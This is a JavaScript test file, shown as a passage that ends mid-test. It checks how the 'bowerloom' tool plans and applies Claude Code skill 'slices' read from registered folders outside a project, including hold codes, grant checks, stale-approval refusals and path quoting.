// Spec 05, Part B, sections 10.3, 10.12 and 10.14 for registered folders: `bowerloom apply` plans a slice whose root is a
// folder outside the project, found through the store. Every test runs with the network denied, in its own HOME.
import test from '../../../dist/tests/support/lock-slot-retry.js';
import { after } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import path from 'node:path';
import { createHash } from 'node:crypto';
import { denyNetwork } from './sync-fixture.mjs';
import { wikiProject, createSlice, put, plan, applied, review, code, exists, read, rewriteSlice, sliceAgent, registeredFolder, allowFolder, agentProject, measureInput, signal } from './slices-fixture.mjs';
import { planFolderRemove, applyFolderRemove, planFolderAdd, applyFolderAdd } from '../../../dist/packages/project-context/src/index.js';
import { applyProjectApply } from '../../../dist/packages/project-sync/src/index.js';
import { readSliceTree } from '../../../dist/packages/managed-skills/src/local-source.js';
import { measureContext, showSlice } from '../../../dist/packages/project-sync/src/index.js';
import { agentsMayBeTracked } from '../../../dist/packages/project-sync/src/slices.js';
import { parse } from 'yaml';
import { planProjectApply } from '../../../dist/packages/project-sync/src/index.js';
import { readSliceTree as readSliceTreeFor } from '../../../dist/packages/managed-skills/src/local-source.js';
import { writeConfig } from './config-fixture.mjs';

const network = denyNetwork();
after(() => assert.deepEqual(network, []));
const slice = p => p.slices[0];
const esc = text => text.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
const front = text => parse(text.split('\n---\n')[0].replace(/^---\n/, ''));
const guardArgs = (f, role = 'lead') => front(read(f, `.claude/agents/${role}.md`)).hooks.PreToolUse.at(-1).hooks[0].args;
const sha = file => createHash('sha256').update(fs.readFileSync(file)).digest('hex');

/** A project with the slice `wiki` over the registered folder `kb`, root `wiki`. */
async function registeredProject(t, options = {}) {
  const f = await wikiProject(t, { slice: false }), kb = await registeredFolder(f, t, options);
  await createSlice(f, 'wiki', { registered: kb.name, root: 'wiki' });
  return { f, kb };
}

test('R1. a slice of a registered folder plans the exact install line, the outside note, and the root of the plan item', async t => {
  const { f, kb } = await registeredProject(t), p = await plan(f, ['claude']), s = slice(p);
  assert.deepEqual([s.id, s.state, s.action, s.guard, s.hold], ['wiki', 'new', 'install', 'root', null]);
  assert.deepEqual(s.members, ['a.md', 'sub/b.md']); assert.deepEqual(s.covered, ['./', 'sub/']);
  assert.deepEqual([s.root.kind, s.root.name, s.root.path, s.root.dir, s.root.recordSha256], ['registered', kb.name, 'wiki', kb.wiki, sha(kb.record)]);
  const st = fs.statSync(kb.wiki, { bigint: true }); assert.deepEqual([s.root.identity.device, s.root.identity.inode, s.root.identity.birthtimeNs], [String(st.dev), String(st.ino), String(st.birthtimeNs)]);
  assert.match(s.expected.source.root.id, /^[a-f0-9]{32}$/); assert.deepEqual({ ...s.expected.source, root: { ...s.expected.source.root, id: 'ID' } }, { kind: 'slice', path: 'slices/wiki.yaml', root: { kind: 'registered', name: kb.name, path: 'wiki', id: 'ID' }, guard: 'root' });
  assert.equal(s.notes.outsideProject, true);
  const text = review(p);
  assert.match(text, new RegExp(`^ {2}wiki +install slice: \\.claude/skills/slice-wiki/SKILL\\.md \\(2 files from registered folder ${kb.name} \\(${esc(kb.display)}\\)\\)$`, 'm'));
  assert.match(text, new RegExp(`^ {2}Note: slice wiki reads ${esc(kb.display)}, outside this project\\. Claude Code may ask before it reads there\\. Start Claude Code with --add-dir ${esc(kb.wiki)}, or add the folder to permissions\\.additionalDirectories\\.$`, 'm'));
  assert.doesNotMatch(text, /guards the whole project folder/);
});
test('R2. apply writes an index that names the folder from the project, with no absolute path, and a catalog with the name and the path', async t => {
  const { f, kb } = await registeredProject(t); await applied(f, ['claude']);
  const index = read(f, '.claude/skills/slice-wiki/SKILL.md');
  assert.match(index, new RegExp(`\\nSource folder: ${esc(kb.display)} \\(registered folder ${kb.name}\\)\\nFiles: 2\\n`));
  assert.match(index, new RegExp(`- \`${esc(kb.display)}/a\\.md\`: Alpha\\n- \`${esc(kb.display)}/sub/b\\.md\`: Beta\\n$`));
  const catalogText = read(f, '.bowerloom/managed/catalog/slice_wiki.json'), catalog = JSON.parse(catalogText);
  assert.deepEqual({ ...catalog.source.root, id: 'ID' }, { kind: 'registered', name: kb.name, path: 'wiki', id: 'ID' }); assert.deepEqual(catalog.references, ['a.md', 'sub/b.md', './', 'sub/']);
  for (const text of [index, catalogText]) { assert.equal(text.includes(f.home), false); assert.equal(text.includes(kb.dir), false); }
  assert.equal(fs.existsSync(path.join(kb.dir, '.claude')), false, 'Bowerloom never writes the registered folder');
  assert.deepEqual(fs.readdirSync(kb.wiki).sort(), ['a.md', 'sub']);
});
test('R3. after apply the plan says up to date, and an edit of a body in the folder changes nothing', async t => {
  const { f, kb } = await registeredProject(t); await applied(f, ['claude']);
  const before = await plan(f, ['claude']); assert.deepEqual([slice(before).state, slice(before).action, slice(before).installed], ['up-to-date', 'none', true]); assert.equal(before.actionable, false);
  fs.writeFileSync(path.join(kb.wiki, 'a.md'), '# Alpha\nbody a, much longer now\n');
  const after = await plan(f, ['claude']); assert.equal(after.revision, before.revision);
  fs.writeFileSync(path.join(kb.wiki, 'a.md'), '# Alpha, renamed\n');
  const changed = await plan(f, ['claude']); assert.deepEqual(slice(changed).changes, { added: 0, gone: 0, summaries: 1, rootChanged: false, guardChanged: false });
});
test('R4. a store that does not record the name holds SLICE_ROOT_MISSING, and an installed index stays', async t => {
  const { f, kb } = await registeredProject(t); await applied(f, ['claude']);
  const removal = planFolderRemove(f.home, kb.name); await applyFolderRemove(f.home, kb.name, removal.revision, signal());
  const p = await plan(f, ['claude']), s = slice(p);
  assert.deepEqual([s.state, s.action, s.hold.code, s.installed], ['held', 'hold', 'SLICE_ROOT_MISSING', true]);
  assert.equal(s.hold.next, 'Run bowerloom folder list, or register the folder with bowerloom folder add <folder-name> <path>, then run bowerloom apply.');
  assert.match(review(p), /^ {2}wiki +slice held \(SLICE_ROOT_MISSING\)\n {2} +Next: Run bowerloom folder list, or register the folder/m);
  assert.equal(exists(f, '.claude/skills/slice-wiki/SKILL.md'), true);
  // Registered again under the same name, the slice is back and up to date.
  const again = planFolderAdd(f.home, f.home, kb.name, kb.dir); await applyFolderAdd(f.home, f.home, kb.name, kb.dir, again.revision, signal());
  assert.equal(slice(await plan(f, ['claude'])).hold.code, 'FOLDER_NOT_ALLOWED', 'removing a folder removed its grants');
  await allowFolder(f, kb.name); assert.equal(slice(await plan(f, ['claude'])).state, 'up-to-date');
});
test('R5. a folder that is gone holds SLICE_ROOT_MISSING, and a path inside it that is gone holds it too', async t => {
  const { f, kb } = await registeredProject(t);
  fs.renameSync(kb.wiki, path.join(kb.dir, 'moved'));
  assert.deepEqual([slice(await plan(f, ['claude'])).hold.code, slice(await plan(f, ['claude'])).action], ['SLICE_ROOT_MISSING', 'hold']);
  fs.renameSync(path.join(kb.dir, 'moved'), kb.wiki); fs.renameSync(kb.dir, kb.dir + '-gone');
  t.after(() => fs.rmSync(kb.dir + '-gone', { recursive: true, force: true }));
  assert.equal(slice(await plan(f, ['claude'])).hold.code, 'SLICE_ROOT_MISSING');
});
test('R6. a link at the recorded path, a group-writable folder, and an invalid record hold SLICE_ROOT_UNSAFE', async t => {
  const { f, kb } = await registeredProject(t);
  fs.chmodSync(kb.wiki, 0o775);
  let s = slice(await plan(f, ['claude'])); assert.deepEqual([s.hold.code, s.hold.next.startsWith('ls -ld ')], ['SLICE_ROOT_UNSAFE', true]);
  fs.chmodSync(kb.wiki, 0o755);
  fs.renameSync(kb.wiki, path.join(kb.dir, 'real')); fs.symlinkSync(path.join(kb.dir, 'real'), kb.wiki);
  assert.equal(slice(await plan(f, ['claude'])).hold.code, 'SLICE_ROOT_UNSAFE', 'a link in place of the root');
  fs.unlinkSync(kb.wiki); fs.renameSync(path.join(kb.dir, 'real'), kb.wiki);
  fs.writeFileSync(kb.record, '{"format":"bowerloom/store-folder/v1beta1","path":"folder","extra":1}\n', { mode: 0o644 });
  assert.equal(slice(await plan(f, ['claude'])).hold.code, 'SLICE_ROOT_UNSAFE', 'a record with an extra key');
});
test('R7. the other items of the plan still apply when a registered slice is held', async t => {
  const { f, kb } = await registeredProject(t); put(f, 'wiki/x.md', '# Local\n'); await createSlice(f, 'local', { root: 'wiki' });
  fs.renameSync(kb.wiki, path.join(kb.dir, 'moved'));
  const p = await plan(f, ['claude']), by = Object.fromEntries(p.slices.map(s => [s.id, s]));
  assert.deepEqual([by.wiki.action, by.local.action], ['hold', 'install']);
  const r = await applied(f, ['claude']); assert.equal(r.result.held.find(h => h.kind === 'slice').code, 'SLICE_ROOT_MISSING'); assert.equal(exists(f, '.claude/skills/slice-local/SKILL.md'), true);
});
test('R8. a registered folder that holds the project is allowed, and one inside the project holds SLICE_ROOT_UNSAFE with the root to use', async t => {
  const f = await agentProject(t, 'proj-'), stateHome = fs.mkdtempSync(path.join(f.home, 'st-')), extra = { stateRoot: path.join(stateHome, 'bowerloom') };
  t.after(() => fs.rmSync(stateHome, { recursive: true, force: true }));
  // The folder holds the project: its pages are the ones outside .bowerloom and the other hidden folders.
  const holder = await registeredFolderOf(f, t, f.base);
  fs.writeFileSync(path.join(f.projectDir, 'README.md'), '# Readme\n');
  await createSlice(f, 'wiki', { registered: holder.name, root: '.', includes: ['*/*.md'] });
  let s = slice(await plan(f, ['claude'], extra)); assert.equal(s.hold, null, JSON.stringify(s.hold)); assert.deepEqual(s.members, ['project/README.md']);
  assert.match(review(await plan(f, ['claude'], extra)), /\(1 files from registered folder [a-z0-9-]+ \(\.\.\)\)$/m);
  const held = await plan(f, ['claude'], extra); assert.equal(slice(held).notes.wholeProject, true, 'a guarded root that holds the project guards the whole project'); assert.equal(slice(held).notes.outsideProject, false);
  assert.match(review(held), /guards the whole project folder/); assert.doesNotMatch(review(held), /--add-dir/, 'the project is inside the folder, so there is nothing to add');
  // A record that points into the project.
  put(f, 'inner/a.md', '# Inner\n');
  const inner = await registeredFolderOf(f, t, path.join(f.projectDir, 'inner'));
  rewriteSlice(f, 'wiki', text => text.replace(`registered: ${holder.name}`, `registered: ${inner.name}`).replace('path: "."', 'path: "."').replace('"*/*.md"', '"*.md"'));
  s = slice(await plan(f, ['claude'], extra)); assert.deepEqual([s.hold.code, s.hold.next], ['SLICE_ROOT_UNSAFE', 'Use root: inner instead.']);
});
test('R9. the identity of the folder is in the plan revision: a folder replaced after the plan is a stale approval', async t => {
  const { f, kb } = await registeredProject(t), p = await plan(f, ['claude']);
  const pages = { 'a.md': '# Alpha\n', 'sub/b.md': '# Beta\n' };
  fs.rmSync(kb.wiki, { recursive: true }); for (const [rel, text] of Object.entries(pages)) { const file = path.join(kb.wiki, rel); fs.mkdirSync(path.dirname(file), { recursive: true, mode: 0o755 }); fs.chmodSync(path.dirname(file), 0o755); fs.writeFileSync(file, text, { mode: 0o644 }); }
  const q = await plan(f, ['claude']); assert.notEqual(q.revision, p.revision, 'the identity of the root is bound');
  await assert.rejects(applyProjectApply(f.input(['claude']), p.revision, signal()), code('STALE_APPROVAL'));
  assert.equal(exists(f, '.claude/skills/slice-wiki/SKILL.md'), false, 'nothing was written');
});
test('R10. the record of the folder is in the plan revision: a record that points elsewhere changes it, and needs a new grant', async t => {
  const { f, kb } = await registeredProject(t), p = await plan(f, ['claude']);
  const other = path.join(f.home, 'folder-other'); fs.mkdirSync(path.join(other, 'wiki'), { recursive: true, mode: 0o755 }); fs.chmodSync(other, 0o755); fs.chmodSync(path.join(other, 'wiki'), 0o755);
  t.after(() => fs.rmSync(other, { recursive: true, force: true })); fs.writeFileSync(path.join(other, 'wiki/a.md'), '# Alpha\nbody a\n'); fs.writeFileSync(path.join(other, 'wiki/c.md'), '# Gamma\n');
  fs.writeFileSync(kb.record, `{"format":"bowerloom/store-folder/v1beta1","path":"folder-other","id":"${'b'.repeat(32)}"}\n`, { mode: 0o644 });
  const q = await plan(f, ['claude']); assert.notEqual(q.revision, p.revision); assert.equal(slice(q).hold.code, 'FOLDER_NOT_ALLOWED', 'the grant was for the other record');
  await allowFolder(f, kb.name);
  const r = await plan(f, ['claude']); assert.deepEqual(slice(r).members, ['a.md', 'c.md']); assert.notEqual(slice(r).root.recordSha256, slice(p).root.recordSha256);
});
test('R11. a root change from a project folder to a registered folder plans root changed', async t => {
  const f = await wikiProject(t); await applied(f, ['claude']);
  const kb = await registeredFolder(f, t); rewriteSlice(f, 'wiki', text => text.replace('root: "wiki"', `root:\n  registered: ${kb.name}\n  path: "wiki"`));
  const p = await plan(f, ['claude']); assert.equal(slice(p).changes.rootChanged, true); assert.equal(slice(p).action, 'update');
  assert.match(review(p), /, root changed\)$/m);
  await applied(f, ['claude']); assert.match(read(f, '.claude/skills/slice-wiki/SKILL.md'), /Source folder: .* \(registered folder /);
});
test('R12. an agent that names a guarded registered slice gets the root id of the folder, and a replaced folder plans an update', async t => {
  const { f, kb } = await registeredProject(t); sliceAgent(f, 'lead', ['slice-wiki']);
  const p = await plan(f, ['claude']), lead = p.agents.find(a => a.id === 'lead');
  assert.deepEqual(lead.context.guard, ['wiki']); assert.equal(lead.context.guardRoots.length, 1); assert.match(lead.context.guardRoots[0], /^wiki:[a-f0-9]{32}$/);
  assert.doesNotMatch(review(p), /must pass a path to Grep and Glob/, 'a root outside the project is not a subfolder of it');
  await applied(f, ['claude']);
  const args = guardArgs(f, 'lead'); assert.deepEqual(args.slice(args.indexOf('--slice'), args.indexOf('--slice') + 2), ['--slice', 'wiki']); assert.ok(args.includes(lead.context.guardRoots[0]));
  assert.equal((await plan(f, ['claude'])).agents.find(a => a.id === 'lead').action, 'none');
  const pages = fs.readdirSync(kb.wiki); fs.renameSync(kb.wiki, kb.wiki + '-old'); fs.mkdirSync(kb.wiki, { mode: 0o755 }); fs.chmodSync(kb.wiki, 0o755);
  for (const n of pages) fs.cpSync(path.join(kb.wiki + '-old', n), path.join(kb.wiki, n), { recursive: true });
  const q = await plan(f, ['claude']); assert.equal(q.agents.find(a => a.id === 'lead').action, 'update'); assert.notEqual(q.agents.find(a => a.id === 'lead').context.guardRoots[0], lead.context.guardRoots[0]);
});
test('R13. context show and context measure read a registered slice: the baseline is the root, and nothing is written', async t => {
  const { f, kb } = await registeredProject(t); sliceAgent(f, 'lead', ['slice-wiki']); await applied(f, ['claude']);
  const shown = await showSlice({ project: f.project(), stateRoot: f.stateRoot, slice: 'wiki', home: f.home });
  assert.equal(shown.installed, 'installed and the same'); assert.deepEqual(shown.members, ['a.md', 'sub/b.md']); assert.equal(shown.root, kb.display);
  assert.match(shown.index.text, new RegExp(`Source folder: ${esc(kb.display)} \\(registered folder ${kb.name}\\)`));
  const measured = await measureContext(measureInput(f)), lead = measured.agents.find(a => a.role === 'lead');
  assert.equal(measured.baseline.folder, kb.display); assert.equal(measured.baseline.chosenBy, 'slice-roots'); assert.equal(lead.start.slices[0].installed, true);
  assert.equal(lead.onDemand.members.files, 2);
});
test('R14. a held registered slice that is installed is counted as held by the measure', async t => {
  const { f, kb } = await registeredProject(t); sliceAgent(f, 'lead', ['slice-wiki']); await applied(f, ['claude']);
  fs.renameSync(kb.wiki, path.join(kb.dir, 'moved'));
  const measured = await measureContext(measureInput(f)), lead = measured.agents.find(a => a.role === 'lead');
  assert.equal(lead.start.slices[0].hold, 'SLICE_ROOT_MISSING');
});

/** Registers an existing folder by its path, as `folder add` does. */
async function registeredFolderOf(f, t, dir) {
  const name = 'own' + Math.random().toString(36).slice(2, 8);
  t.after(() => fs.rmSync(path.join(f.home, '.bowerloom/folders', name + '.json'), { force: true }));
  const p = planFolderAdd(f.home, f.home, name, dir); await applyFolderAdd(f.home, f.home, name, dir, p.revision, signal()); await allowFolder(f, name);
  return { name, dir };
}

// ------------------------------------------------------------------------------------------------ Part B security round
test('N1. a project without a grant: the slice is held with FOLDER_NOT_ALLOWED, nothing of the folder is read, and every view agrees', async t => {
  const f = await wikiProject(t, { slice: false }), kb = await registeredFolder(f, t, { allow: false }); await createSlice(f, 'wiki', { registered: kb.name, root: 'wiki' }); sliceAgent(f, 'lead', ['slice-wiki']);
  const p = await plan(f, ['claude']), s = slice(p);
  assert.deepEqual([s.state, s.action, s.hold.code, s.hold.next, s.members, s.installed], ['held', 'hold', 'FOLDER_NOT_ALLOWED', `bowerloom folder allow ${kb.name} heading`, [], false]);
  assert.match(review(p), new RegExp(`^ {2}wiki +slice held \\(FOLDER_NOT_ALLOWED\\)\n {2} +Next: bowerloom folder allow ${kb.name} heading$`, 'm'));
  const r = await applied(f, ['claude']); assert.equal(r.result.held.find(h => h.kind === 'slice').code, 'FOLDER_NOT_ALLOWED'); assert.equal(exists(f, '.claude/skills/slice-wiki/SKILL.md'), false, 'no text of the folder is copied');
  const shown = await showSlice({ project: f.project(), stateRoot: f.stateRoot, slice: 'wiki', home: f.home }); assert.deepEqual([shown.hold.code, shown.index, shown.members], ['FOLDER_NOT_ALLOWED', null, []]);
  const measured = await measureContext(measureInput(f)); assert.equal(measured.agents[0].start.slices[0].hold, 'FOLDER_NOT_ALLOWED'); assert.equal(measured.agents[0].onDemand.members.files, 0);
  await allowFolder(f, kb.name); const q = await plan(f, ['claude']); assert.deepEqual([slice(q).action, slice(q).members.length], ['install', 2]);
});
test('N2. a grant for another project does not let this project in, and deny puts it back', async t => {
  const { f, kb } = await registeredProject(t);
  const { planFolderDeny, applyFolderDeny } = await import('../../../dist/packages/project-context/src/index.js');
  const project = { dir: f.projectDir, projectId: f.project().projectId, birthtimeNs: f.project().identity.birthtimeNs }, d = planFolderDeny(f.home, project, kb.name); await applyFolderDeny(f.home, project, kb.name, d.revision, signal());
  assert.equal(slice(await plan(f, ['claude'])).hold.code, 'FOLDER_NOT_ALLOWED');
});
test('N3. the plan names what it copies: first heading, or a frontmatter key, from the absolute folder', async t => {
  const { f, kb } = await registeredProject(t);
  const lines = p => review(p).split('\n').filter(l => /^ {2}Note: slice wiki copies/.test(l));
  assert.deepEqual(lines(await plan(f, ['claude'])), [`  Note: slice wiki copies the first heading of 2 files from ${kb.wiki} into .claude/skills/slice-wiki/SKILL.md.`]);
  rewriteSlice(f, 'wiki', text => text.replace('summary: heading', 'summary: frontmatter:api_key'));
  await allowFolder(f, kb.name, 'frontmatter:api_key');
  assert.deepEqual(lines(await plan(f, ['claude'])), [`  Note: slice wiki copies frontmatter key api_key of 2 files from ${kb.wiki} into .claude/skills/slice-wiki/SKILL.md.`]);
  rewriteSlice(f, 'wiki', text => text.replace('summary: frontmatter:api_key', 'summary: none'));
  assert.deepEqual(lines(await plan(f, ['claude'])), [`  Note: slice wiki copies no text from ${kb.wiki}, only the paths of 2 files.`]);
  assert.deepEqual(slice(await plan(f, ['claude'])).copies, { summary: 'none', key: null, count: 2, folder: kb.wiki });
});
test('N3b. decision 5, option B: a slice that asks for another summary kind than the grant is held until folder allow runs again, in every view', async t => {
  const { f, kb } = await registeredProject(t); sliceAgent(f, 'lead', ['slice-wiki']); await applied(f, ['claude']);
  rewriteSlice(f, 'wiki', text => text.replace('summary: heading', 'summary: frontmatter:api_key'));
  const p = await plan(f, ['claude']), s = slice(p);
  assert.deepEqual([s.state, s.action, s.hold.code, s.hold.next, s.members, s.installed], ['held', 'hold', 'FOLDER_NOT_ALLOWED', `This project's grant for ${kb.name} allows the summary kind heading, and one grant holds one kind per folder. Run bowerloom folder allow ${kb.name} frontmatter:api_key. Slices of ${kb.name} that ask for heading are held until you allow heading again.`, [], true]);
  const shown = await showSlice({ project: f.project(), stateRoot: f.stateRoot, slice: 'wiki', home: f.home }); assert.deepEqual([shown.hold.code, shown.index, shown.members], ['FOLDER_NOT_ALLOWED', null, []]);
  const measured = await measureContext(measureInput(f)); assert.equal(measured.agents.find(a => a.role === 'lead').start.slices[0].hold, 'FOLDER_NOT_ALLOWED');
  const r = await applied(f, ['claude']); assert.equal(r.result.held.find(h => h.kind === 'slice').code, 'FOLDER_NOT_ALLOWED');
  await allowFolder(f, kb.name, 'frontmatter:api_key'); assert.equal(slice(await plan(f, ['claude'])).hold, null);
  rewriteSlice(f, 'wiki', text => text.replace('summary: frontmatter:api_key', 'summary: none'));
  assert.equal(slice(await plan(f, ['claude'])).hold, null, 'a slice with summary none copies no text');
});
test('N3e. the next step names the exact kind, says when the grant holds another kind, and says when the grant has no kind', async t => {
  const { f, kb } = await registeredProject(t);
  rewriteSlice(f, 'wiki', text => text.replace('summary: heading', 'summary: frontmatter:api_key'));
  assert.equal(slice(await plan(f, ['claude'])).hold.next, `This project's grant for ${kb.name} allows the summary kind heading, and one grant holds one kind per folder. Run bowerloom folder allow ${kb.name} frontmatter:api_key. Slices of ${kb.name} that ask for heading are held until you allow heading again.`);
  const dir = path.join(f.home, '.bowerloom/folders', kb.name + '.grants'), file = path.join(dir, fs.readdirSync(dir)[0]);
  fs.writeFileSync(file, fs.readFileSync(file, 'utf8').replace(/,"summary":"[^"]*"/, ''));
  const s = slice(await plan(f, ['claude']));
  assert.equal(s.hold.next, `The grant for ${kb.name} was made before Bowerloom recorded a summary kind, so it counts as no grant. Run bowerloom folder allow ${kb.name} frontmatter:api_key.`);
  assert.deepEqual(Object.keys(s.hold), ['code', 'next'], 'a held slice names a code and a next step only, never a folder mixed with a kind');
});
test('N3c. a grant made before the kind was recorded holds the slice, and says what to run', async t => {
  const { f, kb } = await registeredProject(t);
  const dir = path.join(f.home, '.bowerloom/folders', kb.name + '.grants'), file = path.join(dir, fs.readdirSync(dir)[0]);
  fs.writeFileSync(file, fs.readFileSync(file, 'utf8').replace(/,"summary":"[^"]*"/, ''));
  const s = slice(await plan(f, ['claude'])); assert.deepEqual([s.hold.code, s.hold.next], ['FOLDER_NOT_ALLOWED', `The grant for ${kb.name} was made before Bowerloom recorded a summary kind, so it counts as no grant. Run bowerloom folder allow ${kb.name} heading.`]);
  await allowFolder(f, kb.name); assert.equal(slice(await plan(f, ['claude'])).hold, null);
});
// Review fix 1: the grant is looked up again in phase B of apply, with the kind, so a change after the approval is stale.
// The change runs inside the slice hook, after the replan read the slice and before phase B, which is the window the lookup closes.
for (const [label, change] of [
  ['folder deny', file => fs.unlinkSync(file)],
  ['folder allow with another kind', file => fs.writeFileSync(file, fs.readFileSync(file, 'utf8').replace('frontmatter:api_key', 'heading'))],
]) {
  test(`N3d. ${label} between the approval and apply: apply refuses STALE_APPROVAL and writes nothing`, async t => {
    const { f, kb } = await registeredProject(t); sliceAgent(f, 'lead', ['slice-wiki']);
    rewriteSlice(f, 'wiki', text => text.replace('summary: heading', 'summary: frontmatter:api_key')); await allowFolder(f, kb.name, 'frontmatter:api_key');
    const approved = await plan(f, ['claude']); assert.equal(slice(approved).action, 'install');
    const dir = path.join(f.home, '.bowerloom/folders', kb.name + '.grants'); let changed = false;
    const hook = (...args) => { const r = readSliceTree(...args); if (!changed) { changed = true; change(path.join(dir, fs.readdirSync(dir)[0])); } return r; };
    await assert.rejects(applyProjectApply(f.input(['claude'], { sliceTree: hook }), approved.revision, signal()), e => { code('STALE_APPROVAL')(e); assert.match(e.message, new RegExp(`The grant or the folder of slice wiki changed since the plan \\(FOLDER_NOT_ALLOWED\\)`)); return true; });
    assert.equal(changed, true);
    assert.equal(exists(f, '.claude/skills/slice-wiki/SKILL.md'), false, 'no frontmatter value is written');
  });
}
test('N4. the plan warns when .claude/skills may be committed, and a git-ignore line silences it', async t => {
  const { f, kb } = await registeredProject(t); fs.mkdirSync(path.join(f.projectDir, '.git'));
  const warn = new RegExp(`^ {2}Note: slice wiki puts text of ${esc(kb.wiki)} into \\.claude/skills, and Bowerloom found no \\.gitignore line that keeps \\.claude/skills out of git\\. Do not commit it\\.$`, 'm');
  const p = await plan(f, ['claude']); assert.equal(p.skillsMayBeTracked, true); assert.match(review(p), warn);
  for (const line of ['.claude/', '.claude', '.claude/skills', '.claude/skills/', '**/.claude/skills/']) {
    fs.writeFileSync(path.join(f.projectDir, '.gitignore'), line + '\n'); const q = await plan(f, ['claude']); assert.equal(q.skillsMayBeTracked, false, line); assert.doesNotMatch(review(q), /Do not commit it/);
  }
  fs.writeFileSync(path.join(f.projectDir, '.gitignore'), '.claude/\n!.claude/skills\n'); assert.equal((await plan(f, ['claude'])).skillsMayBeTracked, true);
  fs.writeFileSync(path.join(f.projectDir, '.gitignore'), '.claude/agents\n'); assert.equal((await plan(f, ['claude'])).skillsMayBeTracked, true, 'the agents line does not cover skills');
  assert.equal(agentsMayBeTracked(f.projectDir, f.home, 'agents'), false);
});
test('N5. a project root slice has no copy note and no tracked-skills warning', async t => {
  const f = await wikiProject(t); fs.mkdirSync(path.join(f.projectDir, '.git')); const p = await plan(f, ['claude']);
  assert.doesNotMatch(review(p), /Note: slice wiki (copies|puts text)|Do not commit it/); assert.equal(p.skillsMayBeTracked, false); assert.equal(slice(p).copies, null);
});
test('S6. a folder replaced at the same path plans root changed, with the same members', async t => {
  const { f, kb } = await registeredProject(t); await applied(f, ['claude']);
  fs.cpSync(kb.wiki, kb.wiki + '-copy', { recursive: true }); fs.rmSync(kb.wiki, { recursive: true }); fs.cpSync(kb.wiki + '-copy', kb.wiki, { recursive: true });
  const p = await plan(f, ['claude']), s = slice(p);
  assert.deepEqual([s.action, s.changes.rootChanged, s.changes.added, s.changes.gone], ['update', true, 0, 0]); assert.match(review(p), /\(0 added, 0 gone, 0 summaries changed, root changed\)$/m);
});
test('F1. a root that cannot be read after the tree was read holds the slice, and a request for a registered slice never names the project', async t => {
  const { f, kb } = await registeredProject(t);
  const gone = (project, id, root, live, lookup) => { const r = readSliceTreeFor(project, id, root, live, lookup); return { ...r, rootDir: path.join(kb.dir, 'vanished') }; };
  const p = await planProjectApply(f.input(['claude'], { sliceTree: gone }));
  assert.deepEqual([slice(p).action, slice(p).hold.code], ['hold', 'SLICE_ROOT_MISSING']);
  const { sliceRequest } = await import('../../../dist/packages/project-sync/src/slices.js');
  const item = { ...slice(await plan(f, ['claude'])), root: null };
  assert.throws(() => sliceRequest(f.projectDir, f.itemsRoot, item), /registered/);
});
test('C3. a registered folder that is the project under another spelling is held as inside the project', async t => {
  const f = await agentProject(t, 'proj-'); put(f, 'inner/a.md', '# Inner\n');
  const inner = await registeredFolderOf(f, t, path.join(f.projectDir, 'inner'));
  await createSlice(f, 'wiki', { registered: inner.name, root: '.' });
  const s = slice(await plan(f, ['claude'])); assert.deepEqual([s.hold.code, s.hold.next], ['SLICE_ROOT_UNSAFE', 'Use root: inner instead.']);
});
test('C5. the --add-dir note uses the absolute folder, and quotes a path with a space or a shell character', async t => {
  const f = await wikiProject(t, { slice: false }), kb = await registeredFolder(f, t, { prefix: "my folder's $x-" });
  await createSlice(f, 'wiki', { registered: kb.name, root: 'wiki' });
  const quoted = `'${kb.wiki.replaceAll("'", "'\\''")}'`, note = review(await plan(f, ['claude'])).split('\n').find(l => /--add-dir/.test(l));
  assert.ok(note.includes(`--add-dir ${quoted}, or add the folder`), note); assert.equal(note.includes('--add-dir ..'), false);
});
test('C0. a project with bowerloom.json (config mode) and a registered slice plans and applies', async t => {
  const { f } = await registeredProject(t); sliceAgent(f, 'lead', ['slice-wiki']);
  writeConfig(f, { teams: [{ id: 'first-team', source: 'project' }] });
  const p = await plan(f, ['claude', 'codex']); assert.notEqual(p.config, null); assert.deepEqual([slice(p).action, slice(p).hold], ['install', null]);
  const r = await applied(f, ['claude', 'codex']);
  assert.deepEqual(r.result.applied.filter(a => a.kind === 'slice' || a.kind === 'agent').map(a => [a.kind, a.id, a.resolvedFrom]).sort(), [['agent', 'lead', 'project'], ['slice', 'wiki', 'project']]);
  assert.match(read(f, '.claude/skills/slice-wiki/SKILL.md'), /registered folder/);
  assert.equal((await plan(f, ['claude', 'codex'])).actionable, false);
});

test('S4. a registered folder that holds the private state folder is held, even when it holds the project too', async t => {
  const f = await agentProject(t, 'proj-'); const holder = await registeredFolderOf(f, t, f.base);
  await createSlice(f, 'wiki', { registered: holder.name, root: '.', includes: ['*/*.md'] });
  const s = slice(await plan(f, ['claude'])); assert.deepEqual([s.action, s.hold.code], ['hold', 'SLICE_ROOT_UNSAFE']);
});

test('F6. context show of a held registered slice names the registered folder and the path the definition gives', async t => {
  const { f, kb } = await registeredProject(t); fs.renameSync(kb.wiki, path.join(kb.dir, 'moved'));
  const shown = await showSlice({ project: f.project(), stateRoot: f.stateRoot, slice: 'wiki', home: f.home });
  assert.deepEqual([shown.hold.code, shown.registered, shown.root, shown.index], ['SLICE_ROOT_MISSING', kb.name, 'wiki', null]);
  rewriteSlice(f, 'wiki', () => 'format: nope\n'); const bad = await showSlice({ project: f.project(), stateRoot: f.stateRoot, slice: 'wiki', home: f.home });
  assert.deepEqual([bad.registered, bad.root], [null, null]);
});
test('F7. an agent whose guarded registered root holds the project gets the note to pass a path to Grep and Glob', async t => {
  const f = await agentProject(t, 'proj-'), stateHome = fs.mkdtempSync(path.join(f.home, 'st-')), extra = { stateRoot: path.join(stateHome, 'bowerloom') };
  t.after(() => fs.rmSync(stateHome, { recursive: true, force: true }));
  const holder = await registeredFolderOf(f, t, f.base); fs.writeFileSync(path.join(f.projectDir, 'README.md'), '# Readme\n');
  await createSlice(f, 'wiki', { registered: holder.name, root: '.', includes: ['*/*.md'] }); sliceAgent(f, 'lead', ['slice-wiki']);
  assert.match(review(await plan(f, ['claude'], extra)), /^ {2}Note: agent lead must pass a path to Grep and Glob\. A search of the whole project reaches the guarded folder \.\.\.$/m);
});

test('L1. a record that is lost and added again does not let an old project install without folder allow', async t => {
  const { f, kb } = await registeredProject(t); await applied(f, ['claude']);
  fs.unlinkSync(kb.record);
  const add = planFolderAdd(f.home, f.home, kb.name, kb.dir); assert.equal(add.oldGrants, 1); await applyFolderAdd(f.home, f.home, kb.name, kb.dir, add.revision, signal());
  const p = await plan(f, ['claude']); assert.deepEqual([slice(p).action, slice(p).hold.code, slice(p).installed], ['hold', 'FOLDER_NOT_ALLOWED', true]);
